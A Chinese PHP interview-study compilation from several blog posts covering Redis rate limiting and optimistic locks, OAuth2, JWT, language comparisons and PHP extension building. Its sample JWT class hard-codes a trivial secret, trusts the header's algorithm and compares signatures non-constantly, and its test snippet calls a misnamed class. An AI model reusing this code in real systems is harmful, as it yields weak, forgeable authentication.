该代码示例以秒为最小的时间单位，速率=访问次数/时间（$initNum / $expire）
3：每次访问后补充的令牌个数计算方式
获取上次访问的时间即上次存入令牌的时间，计算当前时刻与上次访问的时间差乘以速率就是此次需要补充的令牌个数，注意补充令牌后总的令牌个数不能大于初始化的令牌个数，以补充数和初始化数的最小值为准。
4：程序流程
第一次访问时初始化令牌个数（$minNum），存入Redis同时将当前的时间戳存入以便计算下次需要补充的令牌个数。第二次访问时获取剩余的令牌个数，并添加本次应该补充的令牌个数，补充后如何令牌数>0则当前访问是有效的可以访问，否则令牌使用完毕不可访问。先补充令牌再判断令牌是否>0的原因是由于还有速率这个概念即如果上次剩余的令牌为0但是本次应该补充的令牌>1那么本次依然可以访问。
5：针对并发的处理
使用Redis的乐观锁机制

四、Redis乐观锁介绍
redis对事务的支持比较简单。redis只能保证一个客户端发起的事务命令可以执行，中间不会插入其他事务。因为redis是单线程的，所以做到上面这点很容易。一般redis接受到客户端的命令后会立即执行，但是如果客户端发起multi命令，redis不会立即执行，而是让当前连接进入事务上下文，把命令放到队列中，接受到exec命令后，redis会顺序执行队列中的命令。并把执行结果打包到一起返回客户端，之后就结束了事务上下文。
一、简单的事务控制



这个例子可以看到：两个set命令发出后并没有立即执行而是放到队列中，redis接受到exec命令才开始执行。
如果有两个线程同时修改了一个变量的值，如何控制事务回滚？下面看乐观锁怎么控制的？
二、乐观锁控制事务
1.什么是乐观锁？
大多是基于数据版本的记录机制。什么是数据版本？就是为数据增加一个版本标识，即为数据库表添加一个version字段，当读取数据时，把数据库版本一同读出，当做了修改后，将数据库版本+1，同修改一起提交。如果提交数据的版本号 >数据库当前版本号，提交成功。如图：



2.乐观锁实例
假设数据库中账户信息表中有一个version字段，当前值为1，账户余额为$500

这样避免了操作员B用旧数据修改表中记录的的可能。
3.在redis中怎么体现的？
redis中用watch监视key，如果key在提交前被修改，则提交不成功。如下：



当session1还没来得及对age进行修改，session2已经将age的值设为30，session1再执行的时候失败，因为session1对age加了乐观锁的缘故。
watch命令会监视key，当exec时如果监视的key从调用watch后发生过变化，则整个事务会失败。也可以调用watch多次监视多个key。
三、redis事务存在的问题
redis保证事务中的命令连续执行，但是如果其中一条命令执行失败，事务并不回滚。


为age +1的命令成功，因为anme是string类型的，所以不能做加操作，命令有一个失败也不会回滚，age的值已经被修改了。
```

### OAuth 2 主要用在哪些场景下
```
https://blog.csdn.net/u33445687/article/details/107655728
一、OAuth解决什么问题
1.OAutho2提出的背景
照片拥有者想要在云冲印服务上打印照片，云冲印服务需要访问云存储服务上的资源
在这里插入图片描述

2.图例
资源拥有者：照片拥有着
客户应用：云冲印
受保护的资源：照片
在这里插入图片描述

3.方式一：用户名密码复制
适用于同一公司内部的多个系统，不适用于不受信的第三方应用
在这里插入图片描述

4.方式二：通用开发者Key
适用于合作商或者授信的不同业务部门之间
在这里插入图片描述

5、方式三：颁发令牌
接近OAuth2方式，需要考虑如何管理令牌、颁发令牌、吊销令牌，需要统一的协议，因此就有了OAuth2协议
在这里插入图片描述

二、现代微服务安全
除了开放系统授权，OAuth2还可以应用于现代微服务安全

1.传统单块应用的安全
在这里插入图片描述

2.现代微服务安全
现代微服务中系统微服务化以及应用的形态和设备类型增多，不能用传统的登录方式
核心的技术不是用户名和密码，而是token，由AuthServer颁发token，用户使用token进行登录
在这里插入图片描述

3、典型的OAuth2应用
在这里插入图片描述

三、总结
在这里插入图片描述

四、OAuth2最简向导
川崎高彦：OAuth2领域专家，开发了一个OAuth2 sass服务，OAuth2 as Service，并且做成了一个公司再融资的过程中为了向投资人解释OAuth2是什么，于是写了一篇文章，《OAuth2最简向导》，有兴趣的可以去百度直接搜索。
```

### JWT
```
https://www.cnblogs.com/heyue0117/p/11917540.html
要如何用php实现JWT认证，那我们首先就来认识一下什么是JWT。
什么是JWTJWT(json web token)是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。
JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。
JWT定义了一种用于简洁，自包含的用于通信双方之间以 JSON 对象的形式安全传递信息的方法。JWT 可以使用 HMAC 算法或者是 RSA 的公钥密钥对进行签名。

JWT有两个特点：

自包含(Self-contained)：负载中包含了所有用户所需要的信息，避免了多次查询数据库

简洁(Compact)：可以通过URL, POST 参数或者在 HTTP header 发送，因为数据量小，传输速度快

 

JWT组成

JWT由header，payload，signature三个部分，下面我们用官网的实例先来讲解一个这三个部分的用法。

header部分：

jwt的头部承载两部分信息：

声明类型，这里是jwt

声明加密的算法 通常直接使用 HMAC SHA256

完整的头部就像下面这样的JSON：

{
 "alg": "HS256",
 "typ": "JWT"
}
 

对应base64UrlEncode编码为：

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
说明：该字段为json格式。alg字段指定了生成signature的算法，默认值为HS256，typ默认值为JWT

 

payload部分：

载荷就是存放有效信息的地方。

标准中注册的声明 (建议但不强制使用) ：

iss: jwt签发者

sub: jwt所面向的用户

aud: 接收jwt的一方

exp: jwt的过期时间，这个过期时间必须要大于签发时间

nbf: 定义在什么时间之前，该jwt都是不可用的

iat: jwt的签发时间

jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。

 

{
 "sub": "1234567890",
 "name": "John Doe",
 "iat": 1516239022
}
对应base64UrlEncode编码为：

eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
说明：该字段为json格式，表明用户身份的数据，可以自己自定义字段，很灵活。sub 面向的用户，name 姓名 ,iat 签发时间。例如可自定义示例如下：

{
  "iss": "admin",     //该JWT的签发者
  "iat": 1535967430,    //签发时间
  "exp": 1535974630,    //过期时间
  "nbf": 1535967430,     //该时间之前不接收处理该Token
  "sub": "www.admin.com",  //面向的用户
  "jti": "9f10e796726e332cec401c569969e13e"  //该Token唯一标识
}
 

signature部分：

jwt的第三部分是一个签证信息，这个签证信息由三部分组成：

header (base64后的)

payload (base64后的)

secret

HMACSHA256(
 base64UrlEncode(header) + "." +
 base64UrlEncode(payload),
 123456
) 
 

对应的签名为：

keH6T3x1z7mmhKL1T3r9sQdAxxdzB6siemGMr_6ZOwU
最终得到的JWT的json为(header.payload.signature)：

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.keH6T3x1z7mmhKL1T3r9sQdAxxdzB6siemGMr_6ZOwU
说明：对header和payload进行base64UrlEncode编码后进行拼接。通过key（这里是123456）进行HS256算法签名。

 

JWT的使用流程

初次登录：用户初次登录，输入用户名密码

密码验证：服务器从数据库取出用户名和密码进行验证

生成JWT：服务器端验证通过，根据从数据库返回的信息，以及预设规则，生成JWT

返还JWT：服务器的HTTP RESPONSE中将JWT返还

带JWT的请求：以后客户端发起请求，HTTP REQUEST

HEADER中的Authorizatio字段都要有值，为JWT

服务器验证JWT

 

 

PHP如何实现JWT

这里使用的是PHP 7.0.31，我们新建一个文件jwtAuth.php，完整类代码如下：

<?php
/**
 * PHP实现jwt
 */
class JwtAuth {

  //头部
  private static $header=array(
    'alg'=>'HS256', //生成signature的算法
    'typ'=>'JWT'  //类型
  );

  //使用HMAC生成信息摘要时所使用的密钥
  private static $key='root123456';


  /**
   * 获取jwt token
   * @param array $payload jwt载荷  格式如下非必须
   * [
   * 'iss'=>'jwt_admin', //该JWT的签发者
   * 'iat'=>time(), //签发时间
   * 'exp'=>time()+7200, //过期时间
   * 'nbf'=>time()+60, //该时间之前不接收处理该Token
   * 'sub'=>'www.mano100.cn', //面向的用户
   * 'jti'=>md5(uniqid('JWT').time()) //该Token唯一标识
   * ]
   * @return bool|string
   */
  public static function getToken(array $payload)
  {
    if(is_array($payload))
    {
      $base64header=self::base64UrlEncode(json_encode(self::$header,JSON_UNESCAPED_UNICODE));
      $base64payload=self::base64UrlEncode(json_encode($payload,JSON_UNESCAPED_UNICODE));
      $token=$base64header.'.'.$base64payload.'.'.self::signature($base64header.'.'.$base64payload,self::$key,self::$header['alg']);
      return $token;
    }else{
      return false;
    }
  }


  /**
   * 验证token是否有效,默认验证exp,nbf,iat时间
   * @param string $Token 需要验证的token
   * @return bool|string
   */
  public static function verifyToken(string $Token)
  {
    $tokens = explode('.', $Token);
    if (count($tokens) != 3)
      return false;

    list($base64header, $base64payload, $sign) = $tokens;

    //获取jwt算法
    $base64decodeheader = json_decode(self::base64UrlDecode($base64header), JSON_OBJECT_AS_ARRAY);
    if (empty($base64decodeheader['alg']))
      return false;

    //签名验证
    if (self::signature($base64header . '.' . $base64payload, self::$key, $base64decodeheader['alg']) !== $sign)
      return false;

    $payload = json_decode(self::base64UrlDecode($base64payload), JSON_OBJECT_AS_ARRAY);

    //签发时间大于当前服务器时间验证失败
    if (isset($payload['iat']) && $payload['iat'] > time())
      return false;

    //过期时间小宇当前服务器时间验证失败
    if (isset($payload['exp']) && $payload['exp'] < time())
      return false;

    //该nbf时间之前不接收处理该Token
    if (isset($payload['nbf']) && $payload['nbf'] > time())
      return false;

    return $payload;
  }

  /**
   * base64UrlEncode  https://jwt.io/ 中base64UrlEncode编码实现
   * @param string $input 需要编码的字符串
   * @return string
   */
  private static function base64UrlEncode(string $input)
  {
    return str_replace('=', '', strtr(base64_encode($input), '+/', '-_'));
  }

  /**
   * base64UrlEncode https://jwt.io/ 中base64UrlEncode解码实现
   * @param string $input 需要解码的字符串
   * @return bool|string
   */
  private static function base64UrlDecode(string $input)
  {
    $remainder = strlen($input) % 4;
    if ($remainder) {
      $addlen = 4 - $remainder;
      $input .= str_repeat('=', $addlen);
    }
    return base64_decode(strtr($input, '-_', '+/'));
  }

  /**
   * HMACSHA256签名  https://jwt.io/ 中HMACSHA256签名实现
   * @param string $input 为base64UrlEncode(header).".".base64UrlEncode(payload)
   * @param string $key
   * @param string $alg  算法方式
   * @return mixed
   */
  private static function signature(string $input, string $key, string $alg = 'HS256')
  {
    $alg_config=array(
      'HS256'=>'sha256'
    );
    return self::base64UrlEncode(hash_hmac($alg_config[$alg], $input, $key,true));
  }
}
 

以上是文章全部内容，有需要学习与经验交流的友人请加入Swoole交流群学习与交流的咱们一起学习，有问题一起交流，一起进步！前提是你是学技术的。感谢阅读！

点此加入该群

这里测试一下

//测试和官网是否匹配begin
  $payload=array('sub'=>'1234567890','name'=>'John Doe','iat'=>1516239022);
  $jwt=new Jwt;
  $token=$jwt->getToken($payload);
  echo "<pre>";
  echo $token;

  //对token进行验证签名
  $getPayload=$jwt->verifyToken($token);
  echo "<br><br>";
  var_dump($getPayload);
  echo "<br><br>";
  //测试和官网是否匹配end


  //自己使用测试begin
  $payload_test=array('iss'=>'admin','iat'=>time(),'exp'=>time()+7200,'nbf'=>time(),'sub'=>'www.admin.com','jti'=>md5(uniqid('JWT').time()));;
  $token_test=Jwt::getToken($payload_test);
  echo "<pre>";
  echo $token_test;

  //对token进行验证签名
  $getPayload_test=Jwt::verifyToken($token_test);
  echo "<br><br>";
  var_dump($getPayload_test);
  echo "<br><br>";
  //自己使用时候end
```

### PHP 中 `json_encode(['key'=>123]);` 与 `return json_encode([]);` 区别，会产生什么问题？如何解决
```
https://www.cnblogs.com/dadiaomengmei/p/11212344.html
一.首先是json_encode() 意思是将对象，数组的数据格式转换为json格式的数据，

 

1 <?php
2     $arr=[
3        'apple'=>'🍎',
4        'orange'=>'🍊',
5        'banana'=>'🍌'
6      ];
7 ？>
8   json_encode($arr); //将数组转json格式的数据
 

 

 

二。其次是json_decode() 将json格式的数据转换为对象，数组，转换为数组要加true


1 $json = '{"a":1,"b":2,"c":3,"d":4,"e":5}';
  json_decode($json); //转为对象
　json_decode($json，true); //转为数组　
```

## 加分项
### 了解常用语言特性，及不同场景适用性。
```
```

### PHP VS Golang
```
https://www.php.cn/be/go/421167.html
在工作的项目中，我的主要开发语言是php，因需求或者为弥补php的缺陷，需要为php做各种各样的扩展，
比如php本身不支持线程，没有队列,进程也不无法用于生产环境， 可以说php没有任何“程”，
因而网上有较多的文章阐述如何实现php队列，多线程等等，在我的理解，与其用php本身实现这种无法保证健壮的特性，
不如去发掘运用一些本身集成，且表现优异的语言。

微博中了解到了golang语言， golang的语法类似 C和python， 
有这两种语言经验的同学入门会比较顺利! golang语言的优点在这里就不一一阐述了！！
学习了一段时间之后，维护的业务正好遇到瓶颈,另因我维护的业务属于接口层，逻辑比较简单，只输出json数据，
所以开始着手利用golang重构现有系统，改造中，因部分同事对golang比较怀疑，另外网上的性能对比，
大部分只是hello word输出，参考意义很小，所以利用线上两台内网机器，做了一次php和golang的正式业务性能对比

服务器配置 ： 16核 E5620 @ 2.40GHz 11G内存
业务包含：DB（oracle）和 redis查询， 当有缓存之后，DB不再查询，直接读取redis, 批量查询两个主键

使用apache的ab测试 并发200，20000个请求

golang 并发测试
golang的qps 大约在 9675/s, 最高10200/s 左右 ，cpu利用率高峰在10.6% 上下golang开启了多核， 并且维护了40个redis连接池

上面php的链接是golang的url重写，为了兼容php的项目，不要误解!

PHP并发测试
php的QPS大约是 1726/s, 最高2100/s 左右, cpu 高峰在50.1% 比较恐怖

另外也测试了更多主键的批量查询， golang的处理能力降到 4700/s, php到 1078/s, 将ab并发加到400时， 
php开始出现请求失败的情况，
golang的并发加到2500后，惊讶其表现依然出色， 有怀疑的可以自行测试

上面的测试结果得出的结论: 因多核利用，golang的”多线程”, 还有redis连接池， 
使得go在和php并发对比中遥遥领先，处理能力大约是php的4倍

所以建议维护着请求量较大，遇到瓶颈项目的同学可以尝试使用golang改善!
```

### PHP VS Python
```
https://blog.csdn.net/csdnnews/article/details/88373787
Python大法好！
在过去的两年中，Python一直呈急剧上升的趋势。在后台开发中，PHP和Python是Web专家和开发人员最热门的两个选择。

选择Python代替PHP进行Web开发并不困难，但是我们有很多理由建议开发人员选择前者。
在这篇文章中，我们将看一看Python这门编程语言比PHP更优秀的地方。

如何比较Python与PHP？
PHP已经存在很长时间了，而且它还将继续存在，以下是Python迅速崛起并取代PHP成为更好的语言的十大理由。

1.深思熟虑的设计
即使PHP很好用，但它也算不上一门精致的语言。任何对软件开发有一定了解的开发人员都可以用PHP编写出优秀的软件。
但是，使用PHP需要付出一些代价。
Python的架构让其成为了深思熟虑、设计精良且功能强大的语言。
相反，PHP的设计似乎没有经过深思熟虑。对于经过专业训练的开发人员而言，
Python做了许多努力才让自身成为一门健壮的编程语言，而且也更容易掌握和使用。

2.易于学习
PHP和Python使用起来都很容易。两者都有很好的文档。
但是，如果你是开发人员，你应该从长远来考虑能为你带来最大价值的东西。
你肯定希望使用能够与你建立深厚、丰富和持久关系的语言。
如果你是一位经验丰富的开发人员，那么你需要考虑语言的未来。
你应该使用能够为你建立牢固的关系并能够发挥最大优势的语言。

3.框架
框架通过为开发人员提供应用程序的开发结构，减轻开发人员的负担。
Python主要提供的框架有Django、Flask等。PHP的框架有Kohana、Symfony、CodeIgniter和Zend。
论及Python框架，Django有明显的优势。Django易于使用、安全且速度很快。
新手开发人员选择Django是因为这个框架可以缩短开发时间并简化设置。

4.更准确
PHP基本上是遵循经典的方式。而Python采用非常严格的缩进。
Python不仅比PHP更精确，而且比大多数其他编程语言都精确。

5.简化的语法
Python的语法更为简单，用Python编写代码较为容易。
用Python编写的代码看起来很优雅，这可能是Python比PHP略胜一筹的另一个原因。

6.易于获取的工具
Python提供了一个强大的调试器，名叫PDB（Python Debugger）。
PDB有良好的文档，易于使用，方便初学者使用。
PHP也提供了一个名为X Debug的调试包，用起来也不错。
Python获胜的一个地方是它所需要的调试工具比PHP少。

7.包管理
PHP中确实有包管理，但是支持PHP包管理的代码远远不如支持PIP（安装与管理Python包的工具）的代码那么广泛。
你能够利用PIP安装、卸载、升级和使用大量的内部和外部的库。

8.Python提供的Lambda优于PHP
Python中的Lambda很容易使用，而且易于创建。因此，Python开发人员都喜欢在适合的业务中使用Lambda。
以前，PHP仅支持'create_function'，但它并不能完全等价于Python中的Lambda。

9.Python比PHP更通用
网站开发并不是Python唯一值得关注的一个方面，Python在机器学习、数据科学、图像处理以及桌面和移动应用程序开发中也有很多应用。
而另一方面，可能除了Web开发之外PHP也可以用于其它目的，但它的主要目的和优势都在于创建网页。

10.支持和社区
在功能性、现代化、简洁、优雅和易用等方面，Python都有PHP无可比拟的优势。
Python拥有大量开发、脚本、科研应用等方面的用例，它还拥有一个庞大的社区。
原文：https://medium.com/quick-code/10-reasons-why-python-beats-php-for-web-development-c1af7d785816
```

### PHP VS JAVA
```
https://www.cnblogs.com/itplay/p/10727690.html
这样从几个方面来看：
一、运行机制：
Java代码被编译成字节码后，会在虚拟机里由JIT进行二次编译成为本地码，据传言其执行速度可以和C++相媲美，
经过我自己测试，用Java实现一个简单的Memcache协议的缓存服务器，在Java 1.6下运行，和memcache本身相比，
同样数据量的存取时间比大概是3:2，虽然有差距，但是比想象的要好很多。Java 1.7在JIT方面做了大量的改进，性能比Java 1.6还要好。
PHP是直接对文本代码进行解释执行，即便有opcode缓存技术，仍然有不可逾越的性能鸿沟。
PHP的opcode类似于java的class字节码，仍是解释执行。

二、处理并发：
Java在并发处理上采取单进程多线程的方式，web应用会随着web server的启动而启动，
而来自web 浏览器的请求将被分配给线程池内的闲置线程处理，也就是说当有请求到达的时候，
进程是准备好的，线程是准备好的，Java要做的仅仅是业务逻辑处理了。
PHP在并发处理上时采取多进程的方式，在web server里没有物理的web应用概念，每个请求都相当于一个独立的应用，
而进程也随着请求的到达才启动，而随着请求的结束而消亡。在Fast CGI环境下，有类似于线程池的进程池技术，
对性能提高有很大的帮助。然而一方面web server和Fast cgi通讯仍需要通过socket，
多出了一定的IO损耗，另一方面进程池内的进程间也很难进行通讯，所以在并发处理上仍然无法和Java相比。

三、数据库应用：
Java可以采用数据库连接池技术，节省下数据库连接过程带来的时间损失。
PHP没有这个好处，原因来自上面的第二条。
在数据库接口上java有JDBC，PHP有PDO，这两个很类似。
然而Java有非常多的ORM技术框架(如Hibernate)使数据库操作变得异常简单，
而PHP的运行方式决定了它是ORM的禁区
（当然也可以做ORM，只是做到什么程度是由你对ORM带来的性能损耗的忍受程度决定的）。

四、缓存技术
Java是单进程，很多缓存可以直接在Java的heap中做，而无需借助外在的工具，
当然也有很好的缓存框架，比如Ehcache，因为没有网络IO，所以性能非常高。
PHP多进程单线程决定了它只能借助外来的缓存服务器，比如Memcache.

五、热部署
Java的热部署能力很弱，如果希望修个BUG而不停服是很难做到的。
PHP天然热部署。

六、开发成本
一个好Java程序员所需的知识储备更多，开发、调试所需的周期较长，好点的web server也都是收费的。
PHP免费、web server也免费。

七、安全性
这个要看你怎么来定义安全性，如果是代码安全，java class反编译很容易，这点上来说两者差不多。
Java有安全配置机制可保证一些“非法操作”无法执行，这点上来说PHP较弱。
然而Java很容易因为一个BUG导致整个应用宕掉，PHP就安全的多。
其实要说起来Java的好处多多，然而仅仅最后三条就可以让决策者取PHP而弃Java.
Java可以采用数据库连接池技术，节省下数据库连接过程带来的时间损失。
PHP没有这个好处，原因来自上面的第二条
原因说的具体点，就是php无法保存全局变量，php类中虽然有static变量，
但是这个变量在一次http请求结束后就会被从内存中删除掉，
但是java的static变量是可以一直存在内存中。
这样php就无法使用“池”这种技术，因为无法将池中的数据保存下来

我从JSP和PHP的底层运作、框架扩展两个方面来谈谈两者的优劣。
1.底层运作:PHP使用两层、JSP使用三层来处理用户的请求和回显。
PHP的两层:Web服务器软件(Apache、Nginx)->PHP Zend解析器解释脚本并回显。
JSP的三层:Web服务器软件(Apache、Nginx)->容器->Java虚拟机解析Servlet并回显。
"容器"是JSP中的一个重要概念，容器可以控制servlet的生命周期(实例化和回收servlet);
支持多线程调用servlet并处理线程销毁;使用XML配置安全性，
不用写死在servlet里，不用重新编译;把JSP代码翻译为Java代码。
PHP少了这个中间层，像多线程、安全性自然不如JSP。
但PHP可以采用Opcode技术把脚本解析的结果缓到内存(比如使用APC、eAccelerator、XCache)，
省略了由PHP脚本到Opcode解析过程。这样速度当然比“把JSP代码翻译为Java代码”再由Java虚拟机解释执行快。
不过对于动态确定的内容无法使用Opcode缓存技术。

2.框架扩展：
PHP提供扩展，方便与其它语言相互调用(如C)，也有成熟的PECL扩展可用。
JSP支持多框架，如1)使用Hibernate做数据持久连接，这也是JSP操作数据库比PHP快好多倍的原因，
其次JSP与DB的接口操作也方便。2)使用Spring调用JavaBean处理业务逻辑。
且JSP有Java做后盾，可以调用很多J2EE成熟的库(如EJB)，而PHP是做不到的。

另外，向@毛杭军说的，"PHP开发的人已习惯用由JAVA发扬光大的一些优点"，PHP是面向过程的，所以开发快。
而JSP有Java提供的诸多类库，是面向对象的，所以功能强，但开发慢。
之前公司做大型XXX系统服务器网站，使用的是JSP+ Oracle数据库。淘宝网也使用的也是相同的架构。

一、 语言比较
Php是解释执行的服务器脚本语言，首先php有简单容易上手的特点。语法和c语言比较象，
所以学过c语言的程序员可以很快的熟悉php的开发。而java需要先学好java的语法和熟悉一些核心的类库，
懂得面向对象的程序设计方法。所以java不如php好学。

Java首先要编译成字节码.class文件，然后在java虚拟机上解释执行。Java的web开发首先最容易想到的就是JSP（现在已经到JSP2.0），
原来的java的web开发都是用servlet来实现的，用servlet来开发需要程序员在java的源文件中嵌入大量的html代码。
所以后来就出现了JSP,JSP可以方便的嵌入到html文件当中，其实jsp文件在服务器上执行的时候首先会被应用服务器转换成servlet，
然后再编译执行。Jsp可以通过servlet和JavaBean的支持产生强大的功能。JavaBean 是一种可复用的、跨平台的软件组件。
使用javabean可以方便的实现java代码和html的分离，能够增强系统的功能和软件的复用性。

Java的web开发属于SUN公司定义的J2EE其中的规范。而且在J2EE中包括了java的web开发的所有方面，
如：JSP、Servlet、JDBC、JNDI、JAVABEAN、EJB等等。J2EE就特别适合于做大型的企业级的应用。

二、 数据库访问比较
Java通过JDBC来访问数据库，通过不同的数据库厂商提供的数据库驱动方便地访问数据库。访问数据库的接口比较统一。
PHP对于不同的数据库采用不同的数据库访问接口，所以数据库访问代码的通用性不强。
例如：用Java开发的web应用从MySQL数据库转到Oracle数据库只需要做很少的修改。而PHP则需要做大量的修改工作。

三、 系统设计架构比较
采用Java的web开发技术，需要使用的是面向对象的系统设计方法，而PHP还是采用面向过程的开发方法。
所以用Java进行开发前期需要做大量的系统分析和设计的工作。

四、 跨平台性
Java和PHP都有很好的跨平台的特性。几乎都可以在不作任何修改的情况下运行在Linux或者Windows等不同的操作系统上。

五、 开发成本比较
PHP最经典的组合就是：PHP + MySQL + Apache。非常适合开发中小型的web应用，开发的速度比较快。
而且所有的软件都是开源免费的，可以减少投入。
Java的web应用服务器有免费Tomcat、JBoss等，如果需要更好的商业化的服务有：Web Sphere和 Web logic。

六、 分布式多层架构比较
PHP只能实现简单的分布式两层或三层的架构，而JAVA在这方面就比较强大，可以实现多层的网络架构。
数据库层（持久化层）、应用（业务）逻辑层、表示逻辑层彼此分开，而且现在不同的层都已经有一些成熟的开发框架的支持。
例如Struts就是利用java的web开发技术实现了MVC的设计模式，而在业务逻辑层也有Spring框架，
数据库持久化层有Hibernate等框架。这些框架可以方便开发者高效、合理、科学得架构多层的商业应用。

下面简要的说一下Struts，它实质上是在JSP Model2的基础上实现的一个MVC（Model、View、Controler）框架。
JSP Model2体系结构是一种联合使用JSP 与Servlet 来提供动态内容的方法。
在Struts框架中，模型由实现业务逻辑的JavaBean或EJB组件构成，控制器由Servlet实现的，
视图由一组JSP文件组成。采用Struts可以明确角色的定义和开发者与网页设计者的分工。而且项目越复杂，其优势越明显。

七、 源代码安全
PHP开发的程序的源代码都是公开的，他人拿到php开发的程序后都可以进行修改。
Java开发的程序，最后用户拿到的是只是一些编译好的class类，无法看到完整的源代码，安全性高。

八、性能比较
有人做过试验，对这两种种语言分别做回圈性能测试及存取Oracle数据库测试。
在循环性能测试中，JSP只用了令人吃惊的四秒钟就结束了20000＊20000的回圈。
而PHP测试的是2000＊2000循环（少一个数量级），却分别用了63秒。
数据库测试中，二者分别对 Oracle 8 进行 1000 次 Insert,Update,Select和Delete： JSP 需要 13 秒，PHP 需要 69 秒。
这两种语言使用的场景不是很一样，php一般用来做内容管理系统、论坛（以上两项代表是康盛的产品）、博客（facebook）、社交（微博）。
java一般用做企业级的开发，这种开发的重点适应业务需求的变动性，而且业务的复杂度也比较高。如果性能要求高的，也是要首选java。
facebook、百度、新浪的访问量也很大，但是他们仅仅将php作为页面展示层。facebook使用了多种语言（php，c/c++,java,erlang等），
他们的php直接编译成c++运行，php和各个语言之间使用shift框架进行通信。同时facebook使用大量的nosql。
新浪微博的php，估计也是使用他们自己的引擎，新浪有ACE，估计底层有一些C的扩展。同时他们还有自己的KVDB，来处理大数据。
百度底层的搜索算法层应该是C写的，牵扯到数据库处理层，估计是java或者c写的。
所以说如果使用php处理大数据的话，一般是大公司用，这时候php就退化为一个界面展示层。
java处理大数据，依靠他先天的优势，可以方便的使用连接池等技术，又有soa等成熟技术处理分布式的业务需求。
这方便国内的代表肯定是淘宝、阿里巴巴。
```

### 了解 PHP 扩展开发
```
https://www.cnblogs.com/tosser/p/11564818.html

什么是 PHP 扩展
通俗说，PHP 扩展是增强 PHP 语言功能的插件。PHP 提供了编程语言的语法，比如分支、循环、函数、类等，
这些是 PHP 本身所提供的。在某些情况下需要在 PHP 语言的基础上进行扩展，
那么就需要通过 PHP 底层提供的数据结构和接口来开发 PHP 扩展，从而来补充或扩展 PHP 语言，
使之更加的强大。当然了，PHP 本身就已经集成了一些基本的、强大的、优秀的 PHP 扩展。

PHP 扩展的好处
从上面的了解得知，PHP 扩展可以在 PHP 原有的基础上来扩展 PHP 的功能，使之更为的强大。
另一方面，PHP 扩展可以通过“插件式”的方式来管理和维护 PHP 的功能，如果将全部的功能整合到 PHP 语言中，
PHP 想必会过于臃肿，且又不够灵活。而有了扩展，就解决了这样的问题。

PHP 扩展的存在形式
在 Linux 系统下，PHP 扩展以 .so 文件存在，在 Windows 下以 .dll 文件存在。

什么时候使用 PHP 扩展
单独的使用 PHP 语言并不能满足所有的开发，比如在项目中使用 Redis 或 MongoDB 时，就需要相应的 PHP 扩展，
来增强 PHP 语言，让 PHP 可以来操作 Redis 或者 MongoDB，以完成更加功能强大的项目。

什么时候开发自己的 PHP 扩展
开发自己的 PHP 扩展是必须的么？其实不是。通常情况下，作为一个 PHPer 是不需要自己开发 PHP 扩展的，
但是某些情况下可能是必须要开发 PHP 扩展的。比如，我就遇到了这样的问题。
合作的第三方提供了 Windows 下的动态链接库文件（.dll 文件，非 COM 的 DLL 文件），
而我又没有找到如何在 PHP 下加载调用 DLL 文件的方式，因此我需要写 PHP 扩展，
通过 PHP 的扩展来加载和调用第三方提供的 DLL 文件。

开发自己的 PHP 扩展
在前面我已经提到了我遇到的问题，合作的第三方提供了 Windows 下的动态链接库文件，
而我又没有找到 PHP 下加载和调用 DLL 文件的方式，
因此决定自己编写 PHP 扩展来加载和调用第三方提供的 DLL 文件中的导出函数。
以下，就是我对于搭建开发 PHP 扩展环境和编译 PHP 扩展源码的记录。

准备工具
首先说明一点，DLL 文件只能在 Windows 系统上运行，Linux 系统上是无法进行运行的。
那么，我们这个扩展是不考虑 Linux 系统的，只考虑 Windows 系统即可。
因此，准备的开发工具是 VS2015。起初，我在网上查找了一些资料，很多资料中都写到，
在 Windows 下开发 PHP 扩展需要安装 CygWin，经过我自己的学习，可以告诉大家“不需要”。
当然了，我们的扩展只在 Windows 系统上运行，如果需要在 Linux 系统上运行，是否需要 Cygwin 我就不得而知了。
当然了，其他版本的 VS 也应该是可以的，只是我只测试了 VS2015 罢了。

下载 PHP 的源代码
除了需要安装 VS2015 以外，还需要下载 PHP 的源码，我下载的源码是 PHP 7.2 的源码。
下载 PHP 源码的地址是：https://windows.php.net/download/
打开该地址后，下载如下图所示的源代码：
在这里，下载 PHP 7.2 的源码，并注意在源码下面有一个 VC15 x64 的字样。
下载完的的文件为：php-7.2.20-src.zip
下载完源码进行解压，解压后的目录为：php-7.2.20-src
下载源码并不是一件复杂的事情，但是页面中有多个版本的源码可供下载，选择哪个有时也是比较纠结的问题，
这里就下载 php7.2 的源码，因为我本地使用的就是 php7.2 的环境。

创建扩展
进入 php-7.2.20-src\ext 目录下，在该目录下有一个名为 ext_skel_win32.php 的文件，在命令行中执行：

1 php ext_skel_win32.php --extname=loaddll
其中，loaddll 是要创建的扩展的名称。想要成功执行该命令，需要将 PHP 的可执行程序添加到环境变量中。
执行情况如下：
λ php ext_skel_win32.php --extname=loaddll
Creating directory loaddll
FIND: Parameter format not correct
chmod: missing operand after ‘644’
Try 'chmod --help' for more information.
FIND: Parameter format not correct
chmod: missing operand after ‘755’
Try 'chmod --help' for more information.
Creating basic files: config.m4 config.w32 .gitignore loaddll.c php_loaddll.h CREDITS EXPERIMENTAL tests/001.phpt loaddll.php [done].

To use your new extension, you will have to execute the following steps:
1.  $ cd ..
2.  $ vi ext/loaddll/config.m4
3.  $ ./buildconf
4.  $ ./configure --[with|enable]-loaddll
5.  $ make
6.  $ ./sapi/cli/php -f ext/loaddll/loaddll.php
7.  $ vi ext/loaddll/loaddll.c
8.  $ make

Repeat steps 3-6 until you are satisfied with ext/loaddll/config.m4 and
step 6 confirms that your module is compiled into PHP. Then, start writing
code and repeat the last two steps as often as necessary.
看到如上的输出提示，则说明我们创建的 PHP 扩展生成成功了。以上输出如下所示：

此时，在 \ext 目录下生成了 loaddll 的目录，该目录是生成出的 PHP 的扩展模板，可以在模板的基础上进行开发。

使用 VS2015 创建扩展项目
打开 VS2015，我这里使用的是 VS2015，其他开发环境没有进行测试。
在 VS2015 中选择 “文件” -> “新建” -> “从现有代码创建项目”，来创建 PHP 扩展的解决方案，如下图：
